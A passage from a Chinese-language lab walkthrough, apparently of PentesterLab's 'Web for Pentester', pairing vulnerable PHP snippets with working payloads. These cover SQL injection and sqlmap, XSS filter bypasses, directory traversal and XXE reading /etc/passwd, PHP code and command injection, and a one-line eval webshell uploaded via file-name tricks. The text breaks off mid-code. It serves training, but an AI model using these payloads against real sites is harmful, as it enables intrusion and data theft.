<p>与前面类似，以一个数字开头的，后面可添加构造的sql语句进行攻击测试</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</span><br><span class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-6">Example 6</span><a href="#example-6" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/[0-9]+$/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式值确保了参数id是以一个数字结尾的.他不能确保id参数的开头是合法的.</p>
<p>你可以变通一下前面说到的检测方法.你只需要在你的payload后面加上数字.比如你可以这样:1 or 1=1 # 123</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1</span><br><span class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1</span><br><span class="line">http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-7">Example 7</span><a href="#example-7" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/^-?[0-9]+$/m&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式将检查开始和结束的字符串是一个数字。然而，正则表达式中有一个修饰符/m。它只检查一行，不关心下一行有开始还是结束用数字。所以我们可以绕过它采用id =2\npayload。我们需要把\n转换成十六进制。就是%a0</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.110/sqli/example7.php?id=2%0a</span><br></pre></td></tr></table></figure>
<h2><span id="xss">XSS</span><a href="#xss" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><p>没有做任何过滤</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);</span><br><span class="line">preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);</span><br></pre></td></tr></table></figure>
<p>过滤script标签，利用大写绕过</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span><a href="#example-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);</span><br><span class="line">preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;,$name);</span><br></pre></td></tr></table></figure>
<p>过滤script标签，且使用模式修正符i，忽略大小写。</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span><a href="#example-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/script/i&apos;,$_GET[&quot;name&quot;])</span><br></pre></td></tr></table></figure>
<p>过滤script字符，且使用模式修正符i,忽略大小写。<br>利用img标签</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-5">Example 5</span><a href="#example-5" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/alert/i&apos;,$_GET[&quot;name&quot;]))</span><br></pre></td></tr></table></figure>
<p>过滤alert字符，且使用模式修正符i,忽略大小写<br>利用prompt(),confirm(),String.fromCharCode()函数实现弹框</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(1);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-6">Example 6</span><a href="#example-6" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a=&quot;&lt;?php echo $_GET[&quot;name&quot;];?&gt;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>有源码可以看出，GET方式得到的参数直接发送到javascript代码中，所以在发送Payload的时候不需要添加script标签，只需要发送需要只执行的javascript代码即可。</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
<p>构成以下代码,实现弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a= &quot;hacker&quot;;alert(1);//&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="example-7">Example 7</span><a href="#example-7" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a=&apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]);?&gt;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>使用htmlentities进行HTML编码，默认编码双引号</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;alert(1);//</span><br></pre></td></tr></table></figure>
<h3><span id="example-8">Example 8</span><a href="#example-8" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if （isset($_POST[&quot;name&quot;]）)&#123;</span><br><span class="line">	echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;])</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>利用$_SERVER[‘PHP_SELF’]获取当前页面地址</p>
<p>假设该页面地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/xss/example8.php</span><br></pre></td></tr></table></figure></p>
<p>访问该页面，得到的表单 html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;/xss/example8.php&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-9">Example 9</span><a href="#example-9" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	document.write(location.hash.substring(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="directory-traversal">Directory traversal</span><a href="#directory-traversal" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><p>简单目录遍历</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10/dirtrav/example1.php?file=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!(strstr($file,&quot;/var/www/files/&quot;)))</span><br><span class="line">	die();</span><br></pre></td></tr></table></figure>
<p>检测是否包含/var/www/files/字符串</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/dirtrav/example2.php?file=/var/www/files/../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span><a href="#example-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$path);</span><br></pre></td></tr></table></figure>
<p>使用%00截断后面字符串，读取passwd文件</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
<h2><span id="file-include">File Include</span><a href="#file-include" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;page&quot;]);</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php</span><br></pre></td></tr></table></figure>
<p>读取intro.php文件</p>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$file);</span><br><span class="line">	include($file);</span><br></pre></td></tr></table></figure>
<p>使用%00截断后面字符串</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php%00</span><br></pre></td></tr></table></figure>
<h2><span id="code-injection">Code injection</span><a href="#code-injection" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&apos;name&apos;].&quot;!!!\&quot;;&quot;;  </span><br><span class="line">  </span><br><span class="line">  eval($str);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>使用了反斜杠【\】将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的<br>可以通过${${ }}这样的方式绕过，从而继续执行代码。</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class User&#123;  </span><br><span class="line">  public $id, $name, $age;  </span><br><span class="line">  function __construct($id, $name, $age)&#123;  </span><br><span class="line">    $this-&gt;name= $name;  </span><br><span class="line">    $this-&gt;age = $age;  </span><br><span class="line">    $this-&gt;id = $id;  </span><br><span class="line">  &#125;     </span><br><span class="line">&#125;  </span><br><span class="line">  require_once(&apos;../header.php&apos;);  </span><br><span class="line">  require_once(&apos;../sqli/db.php&apos;);  </span><br><span class="line">    $sql = &quot;SELECT * FROM users &quot;;  </span><br><span class="line">  </span><br><span class="line">    $order = $_GET[&quot;order&quot;];  </span><br><span class="line">    $result = mysql_query($sql);  </span><br><span class="line">  if ($result) &#123;  </span><br><span class="line">        while ($row = mysql_fetch_assoc($result)) &#123;  </span><br><span class="line">      $users[] = new User($row[&apos;id&apos;],$row[&apos;name&apos;],$row[&apos;age&apos;]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    if (isset($order))&lt;span style=&quot;color:#FF0000;&quot;&gt; &#123;   </span><br><span class="line">      usort($users, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));  </span><br><span class="line">    &#125;&lt;/span&gt;  </span><br><span class="line">    &#125;     </span><br><span class="line">  </span><br><span class="line">        ?&gt;  </span><br><span class="line">        &lt;table class=&apos;table table-striped&apos; &gt;  </span><br><span class="line">        &lt;tr&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;  </span><br><span class="line">        &lt;/tr&gt;  </span><br><span class="line">        &lt;?php  </span><br><span class="line">  </span><br><span class="line">    foreach ($users as $user) &#123;    </span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;id.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;name.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;age.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">            echo &quot;&lt;/tr&gt;&quot;;  </span><br><span class="line">        &#125;     </span><br><span class="line">        echo &quot;&lt;/table&gt;&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>create_function()的不当使用造成代码注入，可以这样构造);}phpinfo();//<br>执行我们的命令，);}是闭合了前面的代码，而//则是将后面的内容注释掉</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example2.php?order=id);&#125;phpinfo();//</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span><a href="#example-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example3.php?new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span><a href="#example-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  // ensure name is not empty   </span><br><span class="line">  assert(trim(&quot;&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;&quot;));  </span><br><span class="line">  echo &quot;Hello &quot;.htmlentities($_GET[&apos;name&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如此构造即可：hacker’.phpinfo().’</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example4.php?name=hacker&apos;.phpinfo().&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="commands-injection">Commands injection</span><a href="#commands-injection" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1|id</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&apos;, $_GET[&apos;ip&apos;]))) &#123;</span><br><span class="line">     die(&quot;Invalid IP address&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>正则表达式中有一个修饰符/m。它只检查一行，不关心下一行,此时我们可以利用%0a（换行符）绕过</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0aid</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span><a href="#example-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&apos;, $_GET[&apos;ip&apos;]))) &#123;</span><br><span class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用Location重定向到example3.php?ip=127.0.0.1，这里可以是用curl、burpsuite和nc查看回显</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n&quot; | nc 192.168.56.101 80</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/pentesterlab1.png" alt=""></p>
<h2><span id="file-upload">File Upload</span><a href="#file-upload" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><p>直接上传一句话木马1.php。</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/updata1.png" alt=""></p>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><p>直接上传一句话木马1.php。失败。</p>
<p>把上传文件的文件名修改为1.php.aaaa<br>对于apache这样的服务器，碰到aaaa发现是不认识的文件名后缀，然后就会跳过这个文件名，解析下一个文件名。<br>成功上传</p>
<p>根据php版本也可以尝试.php3,.php4,.php5此类后缀名进行上传。</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php.aaaaa</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php3</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/updata2.png" alt=""></p>
<h2><span id="xml-attacks">XML attacks</span><a href="#xml-attacks" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$xml=simplexml_load_string($_GET[&apos;xml&apos;]);</span><br><span class="line">	print_r((string)$xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>直接读取/etc/passwd</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
<p>Url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.114/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once(&quot;../header.php&quot;);</span><br><span class="line"></span><br><span class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  $xml=simplexml_load_string($x);</span><br><span class="line">  $xpath = 